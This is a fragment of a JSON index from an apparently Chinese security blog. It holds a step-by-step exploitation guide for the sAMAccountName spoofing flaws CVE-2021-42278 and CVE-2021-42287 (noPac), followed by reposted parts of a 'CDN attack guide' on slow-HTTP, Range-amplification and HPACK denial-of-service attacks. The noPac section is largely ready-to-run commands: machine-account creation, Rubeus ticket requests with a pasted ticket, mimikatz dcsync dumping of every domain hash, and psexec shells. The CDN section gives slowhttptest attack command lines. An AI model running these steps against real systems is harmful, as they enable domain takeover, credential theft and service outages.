2012\nWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\nWindows Server 2008 R2 for x64-based Systems Service Pack 1\nWindows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)\nWindows Server 2008 for x64-based Systems Service Pack 2\nWindows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)\nWindows Server 2008 for 32-bit Systems Service Pack 2\nWindows Server 2016 (Server Core installation)\nWindows Server 2016\nWindows Server, version 20H2 (Server Core Installation)\nWindows Server, version 2004 (Server Core installation)\nWindows Server 2022 (Server Core installation)\nWindows Server 2022\nWindows Server 2019 (Server Core installation)\nWindows Server 2019\n0x03 漏洞原理 1.CVE-2021-42278\n允许攻击者使用计算机帐户sAMAccountName欺骗来模拟域控制器。\n2.CVE-2021-42287\n请求服务票证时，首先需要申请 TGT。当 KDC 未找到请求的服务票证时，KDC 会自动再次搜索带结尾带有$的，如果用户user获得了 TGT，随即user用户被删除或修改，并且使用该 TGT进行S4U2self以另一个用户身份请求服务票据时，会导致KDC找不到user账户，从而再次搜索带结尾带有$的user的用户，这时候当我们的user等于DC 机器账户时，会使DC 用自己的密钥加密服务票据 ST，然后就是得到了一个高权限 ST。\n3.CVE-2020-25719\n允许有权创建其他用户或机器帐户的委派管理员可以滥用票证发出时间和呈现时间（返回 AD DC）之间的竞争来模拟不同的帐户，包括高特权帐户。\n场景： CVE-2021-42287和CVE-2021-42287 结合使用可以在申请其他域内的高权限的服务票 据，也就是说，有个a.com 域的abc普通域内用户，对b.com的admin高权限账户有GenericAll 权限（主要是为了设置altSecurityIdentities属性），如果我们拥有这个abc用户，那么我们就可 以获得b.com域的拥有DCsync权限的票据。\n原理：\n​\tb.com的在本域内的活动目录中找不到abc这个账户，那么他就去找本域的域用户中的 AltSecurityIdentities属性是否有次账户，恰巧，我们先一步就设置了admin 账户 altSecurityIdentities属性，那么账户就会添加该帐户的 PAC，这个票据就具有高权限。\n​\t因为利用这两个漏洞需要本地域内查找账户失败，所以需要攻击其他域，而 CVE-2020-25719可以在检索 TGT 后删除帐户，一样的达成利用条件，那么就可以直接攻击 本地域了。 这里很有趣的是，如果一个DC机器账户名字为DC1$,如果DC去找一个账户为DC1，没有找到 ，他就会自己在该账户后面加个$去搜索，就会找到DC1$(DC的机器账户)，并使用DC 的密钥 的来进行加密票据,且可以将票证中的sname重写为 LDAP 服务,用以模拟任意服务。\n​\t那么我们如何去获取一个账户为DC1的机器账户，普通域用户就可以创建，但是因为spn 的缘故，我们不能直接创建DC1的机器账户，只能后面改成DC1。\n那么利用思路以下：\n​\t利用普通域用户创建一个机器账户，机器账户改名为DC1，然后申请TGT，然后把自己改 名，然后DC在TGS_REQ时会找不到这个账户就会以自己的密钥加密TGS，然后我们就可以 模拟域内任何服务的任何用户，就得到了一 个高权限的ST。\n0x04 利用工具 https://github.com/cube0x0/noPac\rhttps://github.com/WazeHell/sam-the-admin\rhttps://github.com/PowerShellMafia/PowerSploit\rhttps://github.com/Kevin-Robertson/Powermad\r 0x06 漏洞前提 需一个域账户密码\n0x06 漏洞复现 1.手动利用 0x01 利用 需要对属性sAMAccountName and servicePrincipalName，具有写权限。说到机器账户，就可以利用域内默认的MAQ特性，默认允许域账户创建10个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。\n查看MAQ是否有限制，查看LDAP中的ms-ds-machineaccountquota属性即可。\n攻击流程：\n  创建一个机器账户，这在之前的文章都有所提及，使用impacket的addcomputer.py或是powermad\naddcomputer.py是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除\n  清除机器账户的servicePrincipalName属性\n  将机器账户的sAMAccountName，更改为DC的机器账户名字，注意后缀不带$\n  为机器账户请求TGT\n  将机器账户的sAMAccountName更改为其他名字，不与步骤3重复即可\n  通过S4U2self协议向DC请求ST\n  DCsync\n  检测DC是否存在漏洞\n可以通过Rubeus来检测，主要检测依据是tgt中是否添加pac，添加了pac就打了补丁，tgt就会 很大。\nRubeus.exe asktgt /user:admin /password:123456 /domain:adlab.com /dc:dc1.adlab.com /nopac /nowrap\r 1.通过域用户使用powermad创建一个机器账户， powershell \u0026quot;set-ExecutionPolicy RemoteSigned\u0026quot; #设置powershell为宽容模式\rImport-Module .\\Powermad.ps1\r$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force\rNew-MachineAccount -MachineAccount test2 -Password $($password) -Domain adlab.com -DomainController dc1.adlab.com -Verbose\r 或者使用addcomputer.py，addcomputer.py是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除\npython3 addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host 10.10.10.100 -domain-netbios adlab 'adlab.com/admin:123456'\r 2.清除机器账户的servicePrincipalName属性 Import-Module .\\Powerview.ps1\rSet-DomainObject \u0026quot;CN=test2,CN=Computers,DC=adlab,DC=com\u0026quot; -Clear 'serviceprincipalname' -Verbose\r 3.将机器账户的sAMAccountName，更改为DC的机器账户名字，注意后缀不带$ Set-MachineAccountAttribute -MachineAccount hello -Value \u0026quot;dc\u0026quot; -Attribute samaccountname -Verbose\r 4.为机器账户请求TGT Rubeus.exe asktgt /user:dc1 /password:ComputerPassword /domian:adlab.com /dc:dc1.adlab.com /nowrap\r 如果报错Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)，说明域控时间与攻击机时间差距较大。修改时间即可\n5.将机器账户的sAMAccountName更改为原本的名字 Set-MachineAccountAttribute -MachineAccount test2 -Value \u0026quot;test2\u0026quot; -Attribute samaccountname -Verbose\r 6.通过S4U2self协议向DC请求ST ./Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:dc.attack.local /self /altservice:LD\rAP/dc.attack.local /ptt /ticket:doIEtjCCBLKgAwIBBaEDAgEWooID0TCCA81hggPJMIIDxaADAgEFoQ4bDEFUVEFDSy5MT0NBTKIhMB+gAwIBAqEY\rMBYbBmtyYnRndBsMYXR0YWNrLmxvY2Fso4IDiTCCA4WgAwIBEqEDAgECooIDdwSCA3NGU25Kb3bBzUrmzGGtZ9DZ4MlrIcxSYgF5bie2LYXWWpOslig/m1F9\rXbNk6A2OHjm5jQxUre+vvFz8tyS2oyhjGykr+BCM5H7B37MXS3j1HtOTXLe/HyJsx8xK0ZT7LG/lWjUJiZOTxrIY+bwNYtS6wFnIzao33nxi0k0R7gXtF4dK\rIzmqKt5K7ttKrcy/h9GsqDPKRowlu7OfjOVe/pQYnh8/QJ0pbXuaF/cT5fKiZcNUR+ihWJFomg+5EaKqohv+f2jRlKRXdaA2BWj3oapSABy7pSvBQioSxrE4\r/2tcWB74BW+ZIbjg9ly6768qUPwGVohOt9Rv05hsCS36mGmCps8/iIxwq16wdH6XYwMzFTcrhZXhUoweSm+Y8B0DLa8GIMxNlYNGkelRKkAZaqZ2IzquaO+G\r5c3gYgZ6dQu32Rfb4Ejwo9jwGgX5WVko4W+k+4zKP/wS6lTHMSoA2vAEL5yp0kvBkMv4ziTfIi9AwH1CWVI6SxoudPkUVsqcfHn3uxoAuSJNMkbkK8elUXJZ\r0hOcC8xoHA8lPEjnK1BFesmCSRH/2M3CcQ7KRts2+qpWmfuW/078MSZzQWZPqdT7bN3ZahLz58YwaVHcAzGmbgwkHXGpRNQB7hZyXdtTv7LV9vcMDJkbRnQx\rPBBMHIH3KCeGrOTfqAnlJC4WZXGaBtOExRT3EoRLvaVUDxpgLh6kUR6jsKSAdX5P7e6Spi+xGbWXFgsTAaRjhMTEzHnxDWBQDa49zRJhLZGfij4fjnC7IanX\rPxlY3HR/kL+xv/1kSpP/2T9K+nFNSk/VulRfn0WBiVx6r0DCT4mYvmXTJv8d+IMG8oMokX9FawppfWt7O0rwEKb1x/h7yqXI32m80G+RjD51aHwA2+ssOt2q\r1xBNU97ou58hOdGpMq6THuBOPbbu+OgcMsmyU963KrQsrUkqaih+PhLuzlI+vIxcFsr7JM/9poiiq9rNALfsatsYAFlQS7E9dl1HVcNYokzn74/z02k/M66B\r7eA+AcBsfAYmMPROmy7NHf8HG2K+YFdhGH3fWjBNSonzUbpfcB4pPh9JTrPEorRfH2tF8WFS+4xJweBpKgW2LURqVkqHy2tuKwJF6clvElkhQB97lUEC6dXq\rNneYAA42mlmAtgCqpuLs0g9vA/A1ba6pgr1Dq6KsgY/yo4HQMIHNoAMCAQCigcUEgcJ9gb8wgbyggbkwgbYwgbOgGzAZoAMCARehEgQQIzjlEo027OlatbDH\rbcJq4KEOGwxBVFRBQ0suTE9DQUyiDzANoAMCAQGhBjAEGwJkY6MHAwUAQOEAAKURGA8yMDIxMTIxMjA5MjQyOVqmERgPMjAyMTEyMTIxOTI0MjlapxEYDzIw\rMjExMjE5MDkyNDI5WqgOGwxBVFRBQ0suTE9DQUypITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGF0dGFjay5sb2NhbA==\r 7.获取域内所有hash mimikatz\rlsadump::dcsync /domain:adlab.com /all /csv\r dcsync失败是因为缺少LDAP票据，运行以下命令即可\nnoPac.exe -domain p1d3er.com -user server2012 -pass Admin@123 /dc AD-2016.p1d3er.com /mAccount t00ls /mPassword t00ls123 /service ldap /ptt\r 通过psexec弹个交互式shell\npsexec.exe \\\\dc1.adlab.com cmd\r 2.工具利用 1.扫描是否存在漏洞\nnoPac.exe scan -domain adlab.com -user admin -pass 123456\r 2.漏洞利用\nnoPac.exe -domain adlab.com -user admin -pass 123456 /dc DC1.adlab.com /mAccount demo123 /mPassword Password123! /service cifs /ptt\r 查看导入的票据\n获取域内所有hash\nmimikatz\rlsadump::dcsync /domain:adlab.com /all /csv\r 通过psexec弹个交互式shell\npsexec.exe \\\\dc1.adlab.com cmd\r 0x07 参考地址 https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html\rhttps://mp.weixin.qq.com/s/E3FMHiZ2EPz1D22P_iNZEQ\r ","id":14,"section":"posts","summary":"0x01 漏洞详情 该漏洞是由于Active Directory 域服务没有进行适当的安全限制，导致可绕过安全限制进行权限提升。 0x02 影响版本 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core","tags":["域渗透","内网渗透"],"title":"域渗透-sAMAccountName spoofing(CVE-2021-42278、CVE-2021-42287 ) ","uri":"https://ad-calcium.github.io/2021/12/%E5%9F%9F%E6%B8%97%E9%80%8F-samaccountname-spoofingcve-2021-42278cve-2021-42287/","year":"2021"},{"content":"文章转载安全客，源地址：https://www.anquanke.com/post/id/231441\nCDN 2021 完全攻击指南 （二）中主要介绍了协议层管制下的放大攻击和HPACK编码攻击，本篇文章是完结篇，将会介绍另外两种扩展的攻击手段。  基于HTTP慢速访问的预请求攻击 HTTP慢速攻击（HTTP Slow Dos Attack）是针对应用层的拒绝服务攻击，主要针对的协议为HTTP，攻击相对DDOS来说，更加隐蔽和高效。\nHTTP协议建立连接后会保持打开状态，直到数据接收完成为止，所以HTTP慢速攻击利用了HTTP的合法机制，以极低的速度往服务器发送HTTP请求，同时长时间的保持连接不释放。\n若是达到了Web Server对于并发连接数的上限，同时恶意占用的连接没有被释放，那么服务器端将无法接受新的请求，导致了拒绝服务，攻击的成本非常低。\n先来看一个简单的GET请求：\n\n我用burp发了一个简单的GET请求，但是确什么响应也没有，Response直接卡住，这类问题其实平常大家测试时候肯定都有遇见过。\n原因就是红框中的 \\r\\n ，又称为CRLF，在正常的HTTP数据包头部，是以2个CRLF空红标记表示结束的。\n由于此次GET请求中，我的服务器只收到了一个 \\r\\n 标记，因此将认为HTTP请求头部分没有结束，并保持此连接不释放，继续等待我传递完整的请求。\n\n此时输入回车，再发送数据包，就可以正常得到响应了，因为用2个CRLF标记表示当前请求的HTTP头已经结束，body为空，服务器正常处理。\n那么当我们作为客户端发送一个HTTP请求，故意只构造一个 CRLF 标记，剩下的内容分为10s发送一次，那么服务器需要一直等待客户端最后的的 CRLF 标记通知，然后才能解析这个报文。\n那么并发呢？我们通过程序或者脚本并发发送更多的这样的请求，那么服务器会给客户端预留处更多的系统资源来等待和处理一直未传送完成的报文。\n假设服务器的最大连接数是100个，我们使用脚本并发先连接上100次服务器，并且报头部connection字段启用Keep-Alive，那么其他正常的用户就无法正常访问网站了。\n实际测试中我们使用 SlowHTTPTest，SlowHTTPTest 是一个可配置的应用层拒绝服务攻击测试工具，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。\n这里选择手动构建、源码安装，因为签名和源的问题可能导致直接 apt-get install 安装产生问题。\n安装 openssl 和 libssl-dev 依赖：\nsudo apt-get install openssl sudo apt-get install libssl-dev  \n克隆 SlowHTTPTest 项目到本地：\ngit clone https://github.com/shekyan/slowhttptest  \n配置和安装：\n# ./configure # make \u0026amp;\u0026amp; make install  \n\n这样我们就源码构建好了，然后看是否正常启动：\n\n查看帮助：\n\n帮助说明里面告诉我们，攻击的类型支持 Slowloris 、Slow body 和 Slow read 三种，下面分别介绍。\nSlowloris 针对于HTTP请求头部的慢速攻击，前面已经讲到过并举例，通过畸形的 CRLF 标记对请求进行长时间连接。\n# slowhttptest -c 1000 -H -i 10 -r 100 -s 4096 -t GET -u http://xxx.com -p 3 -x 10 -g -o Attack_status  解释一下参数：\n-c : 指定连接数 -H : 攻击类型为 Slowloris -i : 发送数据间隔 -r : 连接速率 -s : 指定 Content-legth 大小 -t : 使用的请求类型 -u : 目标网站 -p : 响应超时时间 -x : 每次发送的最大数据长度 -g : 生成统计报告 -o : 输出报告文件  执行后可以看到，几秒钟后web服务器的连接池就被占满无法访问，当前连接数为996，目标服务器服务已不可用：\n\n\nSlow body 该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。\nslowhttptest -c 1000 -B -i 110 -r 100 -s 8192 -t GET -u http://xxx.com -x 10 -p 3 -g -o Attack_status.html  -B 参说明启用Slow Http Post模式发送未完成的HTTP消息体。\n\n\nSlow read Slow read 会在Web服务器响应内容传输回来的时候，客户端缓慢的读取响应报文，就是慢速读取web服务器传输过来的数据，如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会占满web服务器的连接池。\n当web服务器缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求。\nslowhttptest -c 1000 -X -r 100 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http:// -p 3 -g -o Attack_status.html  其中：\n-X : 使用Slow Read attack模式，缓慢读取HTTP响应请求； -w -y : 指定window size大小 -n : 指定读取数据的间隔； -z : 指定每次从接收数据的缓冲区中读取数据的长度 -k : 在同一连接中重复请求的次数  \n\n通常，为了防止由于Dos攻击，CDN会断开与后端服务器的连接，并吸收所有流量。在转发GET请求时的确阻止了慢速攻击，但是针对 Pre-POST 的 slow body 慢速攻击，仍然有很大一部分的 CDN 无法正确处理。\n\n在HTTP /1.x 中，这种攻击的损耗比为 1:1，于是可以采用 HTTP2 复用 http 流来实现减少损耗比，达成放大攻击。\n基于全球访问的出口阻断攻击 这种攻击源于CDN设计中的一种特性Shield，设想如下场景：\n\n当多个地区的客户端请求后端服务器新的未被缓存的资源时，CDN会将请求分发到不同的节点，不同节点的 CDN 再去请求服务器，这样在大量客户端访问时，这样的设计是不合理的，很容易造成服务器瘫痪。\n于是CDN厂商使用了Shield，进行了入口/出口的IP分配机制，来提供资源利用率和减少连接污染：\n\n将请求流量统一整理，交由CDN厂商的Shield再去请求后端服务器获取资源，一下子就减小了对服务器的请求压力。\n那么 入口/出口 IP 是否存在一些通用的规律呢，可以见下表统计：\n\n不难发现，大多数CDN厂商的入口 IP 数量远远大于出口 IP 数量，并且在同一个时间区段内，超过90%以上的出口 IP 是同一个，那么现在只需要攻击出口 IP 的 CDN 节点，即可实现出口阻断攻击，将造成单位时间区域内，全球客户端无法访问该节点保护的服务器群。\n实际的攻击案例如图：\n\n当全球不同地区的客户通过CDN Shield请求国内的目标服务器时，在单位时间内，Shield节点的 IP 地址大多数是一样的。\n此时攻击者通过提交敏感的封禁关键词请求，因为请求国内的网站需要经过 GFW 防火墙，此时触发了规则，GFW 直接封禁该出口 IP，导致其他客户的访问出口也被锁死，因此无法访问目标服务器。\n","id":15,"section":"posts","summary":"文章转载安全客，源地址：https://www.anquanke.com/post/id/231441 CDN 2021 完全攻击指南 （二）中主要介绍了协议","tags":["信息收集"],"title":"CDN 2021 完全攻击指南 （三）","uri":"https://ad-calcium.github.io/2021/12/cdn-2021-%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%E4%B8%89/","year":"2021"},{"content":"文章转载安全客，源地址：https://www.anquanke.com/post/id/231437\nCDN 2021 完全攻击指南（一）中主要介绍了当下针对CDN的检测和绕过方法的基本策略，在拜读了清华大学的多篇高纬度的论文后，本篇文章主要从协议层的管制出发，给大家讲述不同的协议规范下，标准和非标准的碰撞，与CDN攻击联系到一起，又会产生怎样的火花？  HTTP范围放大攻击 范围放大攻击又称 Rangeamp，主要利用了HTTP协议中Range请求头的规范和特性来实现，针对目标网站，我们可以发送一个 HEAD 请求，来判断是否支持 Range 请求头：\n\n如果目标网站支持 Range 传输，则会返回 Accept-Ranges: bytes\n当然，我们也可以直接加上 Range: bytes= 请求头去发送数据包，然后查看其是否返回我们指定请求的字节数据，注意响应状态，返回的是 206 Partial Content\n\nSBR小字节范围攻击 SBR小字节范围攻击主要是利用了请求和响应流量之间不对称的方式来进行放大攻击，客户端发送小字节（例如1字节）的Range范围请求，大多数CDN在接受到此类范围请求时，为了缓存优化、降低延迟和减少回源等，可能会采取删除Range头或者扩增请求字节的大小范围，然后再将处理后的HTTP请求发送给后端服务器。\n\n这样一来，我们源请求和处理后的请求之间，会造成响应流量的严重倾斜，也就是不对称，其比值即为攻击放大的倍数。针对1024kb大小的资源来说，其放大倍数基本都在1000倍以上。\n以下是实验中，目标资源大小分别为1MB、10MB和25MB时的流量放大倍数表：\n\nOBR重叠字节范围攻击 OBR利用了多范围请求，多范围Range请求如图所示：\n\n客户端发送类似 Range: bytes=0-1,1-10,200-2000 的多范围HTTP请求，正常情况下，服务器返回的是分段处理后的响应流。\n\n此时客户端请求的是一份资源，但是服务器对重叠范围请求处理后，返回的是 N * 资源大小的数据流量，单词请求压力是之前的 N 倍，因为服务器要做大量的运算和字符串处理，重叠范围请求的越多，压力越大，内存消耗越多。\n但是大部分网站都遵循RFC7233标准对重叠范围请求做了处理和修正。\n\n如图所示，当我们发起请求多个重叠范围时，返回的最大数据为我们的单次资源最大字节数，并不能无限消耗和放大。\n但是在CDN中，有一些CDN并没有遵循标准，此时可以针对两台CDN节点做级联放大攻击，以此来打跨CDN节点。\n\n客户端发送OBR请求给前端CDN，前端CDN节点不经过处理直接发送给后端CDN节点，后端CDN节点与源站，也就是与服务器的交互请求受限于服务器的RFC标准，此时服务器返回最大单个资源请求响应数据。\n后端CDN收到单个资源数据后，因为并未遵循RFC标准，将响应的资源数据放大N倍后传递给前端CDN节点，OBR重叠范围的数目越多，请求压力就越大，最终造成DDOS攻击。\n以下是级联CDN的实测流量放大倍数表：\n\n基于协议转换的HPACK攻击 在 http/1.x 的版本中，请求的Header字段未被压缩，Header字段以字符串进行传输，在高并发的场景下，每个请求都携带了Header字段，浪费了带宽，增加了网络延迟。\n针对这个问题，http/2.x 的版本对Header信息进行压缩编码，从而提高带宽利用率，这种压缩编码算法就是HAPCK。HPACK一种新型压缩器，可消除冗余的header字段，限制已知安全攻击的漏洞，并且在受限环境中使用有限的内存要求。\n在 RFC7541 标准中可以具体的来看HPACK\n\nHPACK将HTTP请求的Header字段看作 name-value 的有序集合对，使用 2 个索引表（静态索引表、动态索引表）来把头部映射到索引值，并对不存在的头部使用哈夫曼编码，并动态缓存到索引，从而达到压缩头部的效果。\n头部的内容包括了 Header Name 和 Header Value两部分，不同的类型包含了不同的内容。\n静态表顾名思义，是预定义好的，总共有61对索引值，表如下：\n\n\n动态表则是在每次HTTP请求中，由客户端进行扩充\n\nk是可以增大的，每次在动态表中插入新的索引，新插入的 key-value 对的索引下标是s+1,动态表里的其他数据下标依次往后挪。\n总的来说，HPACK的压缩和编码特性，结合CDN的前后协议不一致，将会造成新的攻击态势。\n静态表的协议不对称放大攻击 针对源HTTP请求：\nGET / HTTP/1.1 Host: binmake.com Scheme: https  经过静态表编码压缩的过程：\n\n可以看到，压缩后直接从原来的 52 字节压缩到了 16字节：\n82 84 87 41 0B 62 69 6e 6d 61 6b 65 2e 63 6f 6d  kali上我们可以用 nghttp2 自带的 h2load 来测试压缩效率\n\n基本上所有的CDN都支持 HTTP2 协议，但不是所有的后端源服务器都支持。\n所以利用前后端 HTTP 协议不一致造成的不对称差异，可以放大流量，制造拒绝服务攻击：\n\n此时放大倍数约为3.3。\n动态表的协议不对称放大攻击 针对源HTTP请求：\nGET / HTTP/1.1 Host: binmake.com Scheme: https Extension: ......(1000 bytes)  由于请求头中多出了 Extension 字段和1000字节的值，此时预定义的静态表中无法找到，那么HPACK就会使用扩展的动态表来记录：\n\n注意，只有第一次请求的时候，需要未经压缩编码的扩展字段发送给 CDN ，CDN 在HPACK机制下，会将整个扩展字段在动态表中新增一条记录。\n当再次请求同一资源时，CDN会检查匹配动态表是否命中：\n\n\n后续的请求CDN 全部走动态表：\n\n此时放大系数约为 62 倍，远远超过了静态表。\n利用哈夫曼编码的协议不对称放大攻击 根据数据结构当中的树型结构，在哈夫曼算法的支持下构造出一棵最优二叉树，我们把这类树命名为哈夫曼树。哈夫曼编码是在哈夫曼树的基础之上构造出来的一种编码形式，一般应用于压缩和解压缩。\nHPACK 对字符串的处理是支持哈夫曼编码的，见如下表：\n code code as bits as hex len sym aligned to MSB aligned in to LSB bits ( 0) |11111111|11000 1ff8 [13] ( 1) |11111111|11111111|1011000 7fffd8 [23] ( 2) |11111111|11111111|11111110|0010 fffffe2 [28] ( 3) |11111111|11111111|11111110|0011 fffffe3 [28] ( 4) |11111111|11111111|11111110|0100 fffffe4 [28] ( 5) |11111111|11111111|11111110|0101 fffffe5 [28] ( 6) |11111111|11111111|11111110|0110 fffffe6 [28] ( 7) |11111111|11111111|11111110|0111 fffffe7 [28] ( 8) |11111111|11111111|11111110|1000 fffffe8 [28] ( 9) |11111111|11111111|11101010 ffffea [24] ( 10) |11111111|11111111|11111111|111100 3ffffffc [30] ( 11) |11111111|11111111|11111110|1001 fffffe9 [28] ( 12) |11111111|11111111|11111110|1010 fffffea [28] ( 13) |11111111|11111111|11111111|111101 3ffffffd [30] Peon \u0026amp; Ruellan Standards Track [Page 27] RFC 7541 HPACK May 2015 ( 14) |11111111|11111111|11111110|1011 fffffeb [28] ( 15) |11111111|11111111|11111110|1100 fffffec [28] ( 16) |11111111|11111111|11111110|1101 fffffed [28] ( 17) |11111111|11111111|11111110|1110 fffffee [28] ( 18) |11111111|11111111|11111110|1111 fffffef [28] ( 19) |11111111|11111111|11111111|0000 ffffff0 [28] ( 20) |11111111|11111111|11111111|0001 ffffff1 [28] ( 21) |11111111|11111111|11111111|0010 ffffff2 [28] ( 22) |11111111|11111111|11111111|111110 3ffffffe [30] ( 23) |11111111|11111111|11111111|0011 ffffff3 [28] ( 24) |11111111|11111111|11111111|0100 ffffff4 [28] ( 25) |11111111|11111111|11111111|0101 ffffff5 [28] ( 26) |11111111|11111111|11111111|0110 ffffff6 [28] ( 27) |11111111|11111111|11111111|0111 ffffff7 [28] ( 28) |11111111|11111111|11111111|1000 ffffff8 [28] ( 29) |11111111|11111111|11111111|1001 ffffff9 [28] ( 30) |11111111|11111111|11111111|1010 ffffffa [28] ( 31) |11111111|11111111|11111111|1011 ffffffb [28] ' ' ( 32) |010100 14 [ 6] '!' ( 33) |11111110|00 3f8 [10] '\u0026quot;' ( 34) |11111110|01 3f9 [10] '#' ( 35) |11111111|1010 ffa [12] '$' ( 36) |11111111|11001 1ff9 [13] '%' ( 37) |010101 15 [ 6] '\u0026amp;' ( 38) |11111000 f8 [ 8] ''' ( 39) |11111111|010 7fa [11] '(' ( 40) |11111110|10 3fa [10] ')' ( 41) |11111110|11 3fb [10] '*' ( 42) |11111001 f9 [ 8] '+' ( 43) |11111111|011 7fb [11] ',' ( 44) |11111010 fa [ 8] '-' ( 45) |010110 16 [ 6] '.' ( 46) |010111 17 [ 6] '/' ( 47) |011000 18 [ 6] '0' ( 48) |00000 0 [ 5] '1' ( 49) |00001 1 [ 5] '2' ( 50) |00010 2 [ 5] '3' ( 51) |011001 19 [ 6] '4' ( 52) |011010 1a [ 6] '5' ( 53) |011011 1b [ 6] '6' ( 54) |011100 1c [ 6] '7' ( 55) |011101 1d [ 6] '8' ( 56) |011110 1e [ 6] '9' ( 57) |011111 1f [ 6] ':' ( 58) |1011100 5c [ 7] ';' ( 59) |11111011 fb [ 8] '\u0026lt;' ( 60) |11111111|1111100 7ffc [15] '=' ( 61) |100000 20 [ 6] Peon \u0026amp; Ruellan Standards Track [Page 28] RFC 7541 HPACK May 2015 '\u0026gt;' ( 62) |11111111|1011 ffb [12] '?' ( 63) |11111111|00 3fc [10] '@' ( 64) |11111111|11010 1ffa [13] 'A' ( 65) |100001 21 [ 6] 'B' ( 66) |1011101 5d [ 7] 'C' ( 67) |1011110 5e [ 7] 'D' ( 68) |1011111 5f [ 7] 'E' ( 69) |1100000 60 [ 7] 'F' ( 70) |1100001 61 [ 7] 'G' ( 71) |1100010 62 [ 7] 'H' ( 72) |1100011 63 [ 7] 'I' ( 73) |1100100 64 [ 7] 'J' ( 74) |1100101 65 [ 7] 'K' ( 75) |1100110 66 [ 7] 'L' ( 76) |1100111 67 [ 7] 'M' ( 77) |1101000 68 [ 7] 'N' ( 78) |1101001 69 [ 7] 'O' ( 79) |1101010 6a [ 7] 'P' ( 80) |1101011 6b [ 7] 'Q' ( 81) |1101100 6c [ 7] 'R' ( 82) |1101101 6d [ 7] 'S' ( 83) |1101110 6e [ 7] 'T' ( 84) |1101111 6f [ 7] 'U' ( 85) |1110000 70 [ 7] 'V' ( 86) |1110001 71 [ 7] 'W' ( 87) |1110010 72 [ 7] 'X' ( 88) |11111100 fc [ 8] 'Y' ( 89) |1110011 73 [ 7] 'Z' ( 90) |11111101 fd [ 8] '[' ( 91) |11111111|11011 1ffb [13] '\\' ( 92) |11111111|11111110|000 7fff0 [19] ']' ( 93) |11111111|11100 1ffc [13] '^' ( 94) |11111111|111100 3ffc [14] '_' ( 95) |100010 22 [ 6] '`' ( 96) |11111111|1111101 7ffd [15] 'a' ( 97) |00011 3 [ 5] 'b' ( 98) |100011 23 [ 6] 'c' ( 99) |00100 4 [ 5] 'd' (100) |100100 24 [ 6] 'e' (101) |00101 5 [ 5] 'f' (102) |100101 25 [ 6] 'g' (103) |100110 26 [ 6] 'h' (104) |100111 27 [ 6] 'i' (105) |00110 6 [ 5] 'j' (106) |1110100 74 [ 7] 'k' (107) |1110101 75 [ 7] 'l' (108) |101000 28 [ 6] 'm' (109) |101001 29 [ 6] Peon \u0026amp; Ruellan Standards Track [Page 29] RFC 7541 HPACK May 2015 'n' (110) |101010 2a [ 6] 'o' (111) |00111 7 [ 5] 'p' (112) |101011 2b [ 6] 'q' (113) |1110110 76 [ 7] 'r' (114) |101100 2c [ 6] 's' (115) |01000 8 [ 5] 't' (116) |01001 9 [ 5] 'u' (117) |101101 2d [ 6] 'v' (118) |1110111 77 [ 7] 'w' (119) |1111000 78 [ 7] 'x' (120) |1111001 79 [ 7] 'y' (121) |1111010 7a [ 7] 'z' (122) |1111011 7b [ 7] '{' (123) |11111111|1111110 7ffe [15] '|' (124) |11111111|100 7fc [11] '}' (125) |11111111|111101 3ffd [14] '~' (126) |11111111|11101 1ffd [13] (127) |11111111|11111111|11111111|1100 ffffffc [28] (128) |11111111|11111110|0110 fffe6 [20] (129) |11111111|11111111|010010 3fffd2 [22] (130) |11111111|11111110|0111 fffe7 [20] (131) |11111111|11111110|1000 fffe8 [20] (132) |11111111|11111111|010011 3fffd3 [22] (133) |11111111|11111111|010100 3fffd4 [22] (134) |11111111|11111111|010101 3fffd5 [22] (135) |11111111|11111111|1011001 7fffd9 [23] (136) |11111111|11111111|010110 3fffd6 [22] (137) |11111111|11111111|1011010 7fffda [23] (138) |11111111|11111111|1011011 7fffdb [23] (139) |11111111|11111111|1011100 7fffdc [23] (140) |11111111|11111111|1011101 7fffdd [23] (141) |11111111|11111111|1011110 7fffde [23] (142) |11111111|11111111|11101011 ffffeb [24] (143) |11111111|11111111|1011111 7fffdf [23] (144) |11111111|11111111|11101100 ffffec [24] (145) |11111111|11111111|11101101 ffffed [24] (146) |11111111|11111111|010111 3fffd7 [22] (147) |11111111|11111111|1100000 7fffe0 [23] (148) |11111111|11111111|11101110 ffffee [24] (149) |11111111|11111111|1100001 7fffe1 [23] (150) |11111111|11111111|1100010 7fffe2 [23] (151) |11111111|11111111|1100011 7fffe3 [23] (152) |11111111|11111111|1100100 7fffe4 [23] (153) |11111111|11111110|11100 1fffdc [21] (154) |11111111|11111111|011000 3fffd8 [22] (155) |11111111|11111111|1100101 7fffe5 [23] (156) |11111111|11111111|011001 3fffd9 [22] (157) |11111111|11111111|1100110 7fffe6 [23] Peon \u0026amp; Ruellan Standards Track [Page 30] RFC 7541 HPACK May 2015 (158) |11111111|11111111|1100111 7fffe7 [23] (159) |11111111|11111111|11101111 ffffef [24] (160) |11111111|11111111|011010 3fffda [22] (161) |11111111|11111110|11101 1fffdd [21] (162) |11111111|11111110|1001 fffe9 [20] (163) |11111111|11111111|011011 3fffdb [22] (164) |11111111|11111111|011100 3fffdc [22] (165) |11111111|11111111|1101000 7fffe8 [23] (166) |11111111|11111111|1101001 7fffe9 [23] (167) |11111111|11111110|11110 1fffde [21] (168) |11111111|11111111|1101010 7fffea [23] (169) 